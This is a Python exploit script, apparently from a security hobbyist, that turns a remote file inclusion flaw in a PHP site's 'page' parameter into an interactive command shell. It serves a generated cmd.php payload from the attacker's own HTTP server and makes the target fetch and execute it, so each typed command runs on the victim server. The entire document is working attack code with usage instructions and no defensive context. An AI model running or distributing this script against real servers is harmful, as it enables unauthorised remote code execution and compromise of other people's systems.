#!/usr/bin/python3
# PHP /SITE RCE CMD SHELL
# by. j3ss1
# Twitter: @jessitakes
# Github: github.com/jessisec
# Usage: python3 rce_cmd.py target lhost

import threading
import os
import requests
import sys

target = sys.argv[1]
lhost = sys.argv[2]

# Setup Shell
print("[+] Setting Up Shell [+]")

def payload_server():
    os.system("python3 -m http.server 80 >/dev/null 2>&1")
def setup_payload():
    threading.Thread(target=payload_server).start()
    
# Setup Shell Handler
def cmd_handler():
    url = 'http://' + target+':8080/site/index.php?page=http://' + lhost+'/cmd.php'
    output = requests.get(url)
    print(output.text)
    
# Setup Shell Environment
print("[+] Spawning Shell [+]")
def shell():
    command = input("cmd-shell> ")
    if os.path.exists("cmd.php"):
        os.remove("cmd.php")
    f = open("cmd.php", "w+")
    f.write("<?php\n")
    f.write("$exec = system('" + command+"', $val);\n")
    f.write("?>\n")
    f.close()
    cmd_handler()
    shell()
    
# Launch RCE CMD Shell
setup_payload()
shell()
